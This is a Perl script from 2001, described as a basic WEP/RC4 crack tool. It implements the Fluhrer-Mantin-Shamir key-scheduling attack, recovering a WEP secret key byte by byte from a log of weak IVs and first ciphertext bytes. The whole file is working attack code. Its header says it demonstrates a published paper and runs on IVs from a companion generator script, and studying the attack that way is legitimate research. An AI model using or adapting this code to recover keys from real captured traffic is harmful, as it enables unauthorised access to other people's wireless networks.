#!/usr/bin/perl

# Basic WEP/RC4 crack tool that demonstrates the key scheduling weaknesses described in the paper
# "Weakness in the Key Scheduling Algorithm of RC4" by Scott Fluhrer, Itsik Mantin, and Adi Shamir.
#
# script relies on existance of file with list of IVs and 1st encrypted output byte to produce the
# secret key originally used to encrypt the list of IVs. Another script [WeakIVGen.pl] is included to
# produce weak IVs and the encrypted output byte for this script to use.
#
# By : Anton T. Rager - 08/09/2001-08/12/2001
#      a_rager@yahoo.com


$i=0;
$j=0;
$ik=0;
$x=0;


# 802.2 SNAP Header should be 1st plaintext byte of WEP packet
@text = (0xaa);


if (!-f "IVFile.log") {
	die("Error :\nNo IVFile.log file found - run WeakIVGen.pl 1st to generate file\n");
}
# Keysize 11 byte or 5 byte
open (IVFILE, "IVFile.log");
@IVList=<IVFILE>;
close (IVFILE);

$keysize=$IVList[0];	
chomp($keysize);
splice(@IVList, 0, 1);

$bitsize=$keysize*8;
print("Keysize = $keysize \[$bitsize bits\]\n");


for ($B=0; $B < $keysize; $B++) {

	# Init statistics array
	for ($i=0; $i < 256; $i++) {
		$stat[$i]=0;
	}

	foreach $IVRec (@IVList) {

		@IV=split(" ",$IVRec);
		$key[0]=$IV[0];
		$key[1]=$IV[1];
		$key[2]=$IV[2];
	        $encr=$IV[3];

		if ($key[0] eq $B+3) {





# Look for matching IV for 1st Key byte

			$i=0;
			$j=0;
			$ik=0;

			for ($i=0; $i<256; $i++) {
				$S[$i]=$i;

			}

			# 0 to 3+K[b]
			for ($i=0; $i< $B + 3; $i++) {
				$j=($j+$S[$i]+$key[$i]) % 256;
				$temp = $S[$i];
				$S[$i] = $S[$j];
				$S[$j] = $temp;
				if ($i eq 1) {
					$S1[0]=$S[0];	
					$S1[1]=$S[1];
				}
	
			}


			$X=$S[1];
			if ($X < $B + 3) {
				if ($X+$S[$X] eq $B + 3) {
                 			if ($S[0] ne $S1[0] || $S[1] ne $S1[1]) {
						#print("Throwaway IV $IV[0], $IV[1], $IV[2]\n");
					}

# Xor inbyte and outbyte to get S[3]
# plugin S[3] as J and subtract (5+x+S[3]) to get K
				        $S3Calc = $encr ^ $text[0];
					$leaker = $S3Calc-$j-$S[$i];
					$stat[$leaker]++;
#					$match++;

#					if($match >99) {
#						print("100 matches collected in $counter tries\n");
#						exit;
#					}
				}
			}
	


	$max=0;
	$count=0;
	foreach $rank (@stat) {
		if ($rank > $max) {
			$max=$rank;
			$winner=$count;
		}
		$count++;
	}
	}
	}
	print("$winner ");
	push (@key, $winner);
}
print("\n");